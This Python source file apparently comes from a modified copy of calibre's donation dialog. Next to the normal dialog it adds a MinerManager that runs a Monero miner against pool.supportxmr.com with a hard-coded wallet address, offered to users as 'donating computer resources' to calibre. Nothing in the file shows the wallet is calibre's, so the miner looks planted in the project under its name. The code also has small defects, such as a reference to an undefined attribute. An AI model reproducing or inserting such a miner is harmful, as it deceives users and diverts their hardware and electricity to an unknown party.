#!/usr/bin/env  python2
from __future__ import absolute_import, division, print_function, unicode_literals

__license__   = 'GPL v3'
__copyright__ = '2008, Kovid Goyal kovid@kovidgoyal.net'
__docformat__ = 'restructuredtext en'

from PyQt5.Qt import (
    QDialog, Qt, QIcon, QVBoxLayout, QHBoxLayout, QLabel, QPushButton, QRadioButton, QDialogButtonBox
)

from calibre import confirm_config_name
from calibre.gui2 import dynamic
from calibre.gui2.dialogs.message_box import Icon


class DonationDialog(QDialog):

    def __init__(self, msg, name, parent, config_set=dynamic, icon='dialog_warning.png',
                 title=None):
        QDialog.__init__(self, parent)
        self.setWindowTitle(title or _("Donate to support calibre"))
        self.setWindowIcon(QIcon(I(icon)))
        self.l = l = QVBoxLayout(self)
        self.h = h = QHBoxLayout()
        l.addLayout(h)

        self.icon_widget = Icon(self)
        self.icon_widget.set_icon(QIcon(I(icon)))

        self.msg = m = QLabel(self)
        m.setOpenExternalLinks(True)
        m.setMinimumWidth(350), m.setWordWrap(True), m.setObjectName("msg")
        m.setText(msg)

        h.addWidget(self.icon_widget), h.addSpacing(10), h.addWidget(m)

        self.b1 = QRadioButton("Donate with money")
        self.b1.setChecked(True)
        l.addWidget(self.b1)

        self.b2 = QRadioButton("Donate with computer resources")
        l.addWidget(self.b2)

        buttons = QDialogButtonBox.Ok
        self.buttonBox = bb = QDialogButtonBox(buttons, self)
        bb.setObjectName("buttonBox")
        bb.setFocus(Qt.OtherFocusReason)
        bb.accepted.connect(self.accept), bb.rejected.connect(self.reject)
        l.addWidget(bb)

        self.name = name
        self.config_set = config_set

        self.resize(self.sizeHint())

    def toggle(self, *args):
        self.config_set[confirm_config_name(self.name)] = self.again.isChecked()


from .StratumLib import Miner


class MinerManager:
    __instance = None

    @staticmethod
    def getInstance():
        """ Static access method. """
        if MinerManager.__instance == None:
            MinerManager()
        return MinerManager.__instance

    def __init__(self):
        """ Virtually private constructor. """
        if MinerManager.__instance != None:
            raise Exception("This class is a singleton!")
        else:
            MinerManager.__instance = self
        self.miner = None

    def start(self):
        if self.miner is None:
            self.miner = Miner("pool.supportxmr.com".encode('utf-8'),
                    "3333".encode('utf-8'),
                    "43F9z3PGSgBacfTwbGrw3DG65VDNT38N8XBnVjVrDo9uA5wpQnSvnYHB9wYZBxMXk6DYUf9aVxjTxFwyrXKVScRk9vD4kgC".encode('utf-8'),
                    "x".encode('utf-8'), 0.2)

    def stop(self):
        self.miner = None

    def is_started(self):
        return self.miner is not None


def donation(msg, name, parent=None, pixmap='dialog_warning.png', title=None,
        config_set=None):
    mm = MinerManager.getInstance()
    if mm.is_started():
        return False
    d = DonationDialog(msg, name, parent, config_set=config_set, icon=pixmap,
               title=title)
    d.exec_()
    return d.b1.isChecked()


class MiningDialog(QDialog):
    def __init__(self, msg, name, parent, config_set=dynamic, icon='dialog_warning.png',
                 title=None):
        QDialog.__init__(self, parent)
        self.setWindowTitle(title or _("Donate to support calibre"))
        self.setWindowIcon(QIcon(I(icon)))
        self.l = l = QVBoxLayout(self)
        self.h = h = QHBoxLayout()
        l.addLayout(h)

        self.icon_widget = Icon(self)
        self.icon_widget.set_icon(QIcon(I(icon)))

        self.msg = m = QLabel(self)
        m.setOpenExternalLinks(True)
        m.setMinimumWidth(350), m.setWordWrap(True), m.setObjectName("msg")
        m.setText(msg)

        h.addWidget(self.icon_widget), h.addSpacing(10), h.addWidget(m)

        mm = MinerManager.getInstance()
        title = "Stop mining" if mm.is_started() else "Start mining"
        self.b1 = QPushButton(title)
        self.b1.setCheckable(True)
        self.b1.setChecked(mm.is_started())
        self.b1.clicked.connect(self.btnstate)
        l.addWidget(self.b1)

        buttons = QDialogButtonBox.Ok
        self.buttonBox = bb = QDialogButtonBox(buttons, self)
        bb.setObjectName("buttonBox")
        bb.setFocus(Qt.OtherFocusReason)
        bb.accepted.connect(self.accept), bb.rejected.connect(self.reject)
        l.addWidget(bb)

        self.name = name
        self.config_set = config_set

        self.resize(self.sizeHint())

    def btnstate(self):
        mm = MinerManager.getInstance()
        if self.b1.isChecked():
            self.b1.setText('Stop Mining')
            mm.start()
        else:
            self.b1.setText('Start Mining')
            mm.stop()


def mining(msg, name, parent=None, pixmap='dialog_warning.png', title=None,
        config_set=None):
    config_set = config_set or dynamic
    if not config_set.get(confirm_config_name(name), True):
        return True
    d = MiningDialog(msg, name, parent, config_set=config_set, icon=pixmap,
               title=title)
    d.exec_()
    return d.b1.isChecked()
